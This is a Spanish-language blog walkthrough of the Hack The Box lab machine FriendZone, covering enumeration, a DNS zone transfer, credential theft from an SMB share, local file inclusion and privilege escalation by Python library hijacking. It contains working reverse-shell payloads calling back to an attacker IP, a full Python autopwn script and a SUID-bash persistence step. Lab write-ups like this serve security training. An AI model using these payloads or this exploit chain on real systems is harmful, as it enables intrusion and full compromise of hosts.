---
layout: post
title: HTB_FriendZone
date: 2023/07/10
slug: HTB_FriendZone
heroImage: /assets/machines.jpg
---

# FriendZone {-}

## Introduccion {-}

La maquina del dia se llama FriendZone.

El replay del live se puede ver aqui

[![S4vitaar FriendZone maquina](https://img.youtube.com/vi/C5wd5MxNcok/0.jpg)](https://www.youtube.com/watch?v=C5wd5MxNcok)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.123
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.123
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.123 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
```


| Puerto | Servicio | Que se nos occure?         | Que falta?  |
| ------ | -------- | -------------------------- | ----------- |
| 21     | ftp      | Conneccion como anonymous  |             |
| 22     | tcp      | Conneccion directa         | creds       |
| 53     | domain   | axfr attack                | ip y domain |
| 80     | http     | Web, Fuzzing               |             |
| 139    | Samba    | Coneccion con null session |             |
| 443    | https    | Web, Fuzzing               |             |
| 445    | Samba    | Coneccion con null session |             |

### Coneccion ftp como anonymous {-}

```bash
ftp 10.10.10.123
Name: anonymous
Password: 
#Output
Login failed
```

### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.123:443
```

Aqui vemos un un correo 
```bash
 haha@friendzone.red 
```
. Añadimos el dominio friendzone.red al 
```bash
 /etc/hosts 
```
.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.123
```

Es un Apache 2.4.29 en un Ubuntu y podemos ver un nuevo dominio 
```bash
 friendzoneportal.red 
```
 que añadimos al 
```bash
 /etc/hosts 
```
. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 https://10.10.10.123 
```
, No vemos gran cosas. 
Si vamos por la url 
```bash
 https://friendzone.red 
```
 vemos una nueva web, mirando el codigo fuente, vemos un comentario sobre un directorio

```bash
 /js/js 
```
 y si vamos por la url 
```bash
 https://friendzone.red/js/js 
```
 vemos una especie de hash en base64 que intentamos romper con el comando

```bash
 echo "MTZaVFhRMDBrSTE2MzUxMDgwMzRieUxPVHlmdGkz" | base64 -d | base64 -d 
```
 pero no nos da gran cosa. Si miramos la url 
```bash
 https://friendzoneportal.red 
```
,
vemos otra imagen pero tampoco vemos gran cosa en este caso.


### Analyzando el SAMBA {-}

```bash
crackmapexec smb 10.10.10.123
smbclient -L 10.10.10.123 -N
```

Aqui el **smbclient** nos dice que estamos frente una maquina Windows 6.1 aun que sabemos que la maquina victima es un linux.

Vemos recursos compartidos a nivel de red como:

- print$
- Files
- general
- Development
- IPC$

Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos.

```bash
smbmap -H 10.10.10.123
```

y vemos que denemos accesso con derecho de lectura al directorio 
```bash
 general 
```
 y derechos de lectura y escritura al directorio 
```bash
 development 
```
.
Vamos a conectarnos para ver lo que hay por estos registros

```bash
smbclient //10.10.10.123/general -N
dir
```

Vemos un fichero creds.txt y nos lo descargamos con el commando 
```bash
 get creds.txt 
```
. 

Miramos si nos podemos conectar con 
```bash
 ssh admin@10.10.10.123 
```
 pero no podemos y miramos si tenemos accesso a mas registros.

```bash
smbmap -H 10.10.10.123 -u 'admin' -p 'WORKWORKHhallelujah@#'
```

### Ataque de transferencia de zona con Dig {-}

```bash
dig @10.10.10.123 friendzone.red
dig @10.10.10.123 friendzone.red ns
dig @10.10.10.123 friendzone.red mx
dig @10.10.10.123 friendzone.red axfr
```

El ataque de transferencia de zone nos permite ver una serie de subdominios como.

- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red

los introducimos en el 
```bash
 /etc/hosts 
```
 y lo analyzamos en firefox.

### Checkeamos los nuevos dominios {-}

Podemos ver que el 
```bash
 https://hr.friendzone.red 
```
 no nos muestra nada.
La url 
```bash
 https://uploads.friendzone.red 
```
 nos envia a una pagina donde podemos uploadear imagenes y la url

```bash
 https://administrator1.friendzone.red 
```
 nos muestra un panel de inicio de session.

Como hemos encontrado credenciales con smb, intentamos conectarnos desde el panel de inicio de session y estas credenciales son validas.

Aqui vemos que existe un fichero 
```bash
 dashboard.php 
```
. Si vamos a la url 
```bash
 https://administrator1.friendzone.red/dashboard.php 
```
, tenemos un mensaje que
dice que el falta el parametro image_name y que por defecto, necesitamos poner 
```bash
 image_id=a&pagename=timestamp 
```
. Intentamos la url siguiente:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
```

Aqui nos aparece una nueva pagina. Nos llama la atencion el parametro pagename y intentamos cosas

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestam
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard.php
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd%00
```

Aqui hemos constatado que podemos injectar una pagina de la web en esta misma pagina y que no se necessita poner la extension que la pagina añade

```bash
 .php 
```
 por si sola. Es por esto que no se puede ver el 
```bash
 /etc/passwd 
```
 porque añade un 
```bash
 .php 
```
 al final.



## Vulnerability Assessment {-}


### Subiendo ficheros por smb {-}

Cuando hemos mirado los registros compartidos a nivel de red con smbmap, hemos constatado que teniamos derechos de lectura
y de escritura al registro Development. Y esta enumeracion nos a monstrado que el registro Files esta bindeada al directorio

```bash
 /etc/Files 
```
. Esto no hace pensar que si subimos ficheros al registro 
```bash
 Development 
```
, puede que sea finalmente bindeada al directorio 

```bash
 /etc/Development 
```
. 

1. Creamos un fichero php de prueba

    ```php
    <?php
        echo "Esto es una prueba...";
        system("whoami");
    ?>
    ```

1. Con smbclient, subimos el fichero

    ```bash
    put test.php
    ```

1. En el dashboard, intentamos ver si vemos la pagina

    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/Development/test
    ```

Esto nos muestra que podemos ejecutar commandos a nivel de systema.## Vuln exploit & Gaining Access {-}

### Ganando accesso con un un LFI {-}

1. Creamos un fichero reverse.php

    ```php
    <?php
        system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'");
    ?>
    ```

1. Con smbclient, subimos el fichero

    ```bash
    put reverse.php
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. En el dashboard, intentamos ver si vemos la pagina

    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/Development/reverse
    ```

Ya hemos ganado acceso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Creando un autopwn en python {-}

```python
#!/usr/bin/python3

import pdb
import urllib3
import urllib

from smb.SMBHandler import SMBHandler

from pwn import *

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://administrator1.friendzone.red/login.php"
rce_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse"
lport = 443

def getCreds():
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://10.10.10.123/general/creds.txt')
    data = fh.read()
    fh.close()

    data = data.decode('utf-8')
    username = re.findall(r'(.*?):', data)[1]
    password = re.findall(r':(.*)', data)[1]

    return username, password

def makeRequest(username, password):

    urllib3.disable_warnings()

    s = requests.session()
    s.verify = False

    data_post = {
        'username': username,
        'password': password
    }

    r = s.post(login_url, data=data_post)

    os.system("mkdir /mnt/montura")
    os.system('mount -t cifs //10.10.10.123/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw')
    time.sleep(2)
    os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f'); ?>\" > /mnt/montura/reverse.php")
    os.system("umount /mnt/montura")
    time.sleep(2)
    os.system("rm -r /mnt/montura")

    r = s.get(rce_url)

if __name__ == '__main__':

    username, password = getCreds()

    try:
        threading.Thread(target=makeRequest, args=(username, password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```

### Userpivoting {-}

```bash
grep "sh$" /etc/passwd
pwd
ls -l
cat mysql_data.conf
```

Vemos la contraseña del usuario friend y nos podemos convertir con el comando 
```bash
 su friend 
```
 y leer la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
uname -a
find \-perm -4000 2>/dev/null
```

No vemos nada interesante por aqui. Miramos si existen tareas que se ejecutan a interval regulares de tiempo.


```bash
cd /dev/shm/
nano procmon.sh


#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Le damos derechos de ejecucion y lo lanzamos. Si esperamos un poco, podemos ver que hay una tarea que se ejecuta lanzando un script
en python.

```bash
ls -l /opt/server_admin/reporter.py
cat /opt/server_admin/reporter.py
```

Vemos que no lo podemos tocar.

#### Library Hijacking {-}

Vemos que el script no hace nada en concreto. Solo importa la libreria os y almacena dos variables y le hace un print.

1. Miramos el orden de busqueda del import de python

    ```bash
    python
    > import sys
    print sys.path
    ```

    Aqui vemos que busca primeramente en el directorio actual de trabajo y despues en 
```bash
 /usr/lib/python2.7/sys.py 
```


1. Miramos nuestros derechos en la carpeta 
```bash
 /usr/lib/python2.7 
```


    ```bash
    locate os.py
    ls -l /usr/lib/ | grep "python2.7"
    ```

    Vemos que tenemos todo los derechos en esta carpeta

1. Alteramos el fichero os.py

    ```bash
    cd /usr/lib/python2.7
    nano os.py
    ```

    Al final de este fichero, añadimos el comando siguiente

    ```python
    system("chmod 4755 /bin/bash")
    ```

1. Monitorizamos la /bin/bash

    ```bash
    watch -n 1 ls -l /bin/bash
    ```

Vemos que aparece un 
```bash
 s 
```
 en la /bin/bash

```bash
bash -p
whoami
#Output
root
cd /root
cat root.txt
```

Ya podemos leer el root.txt
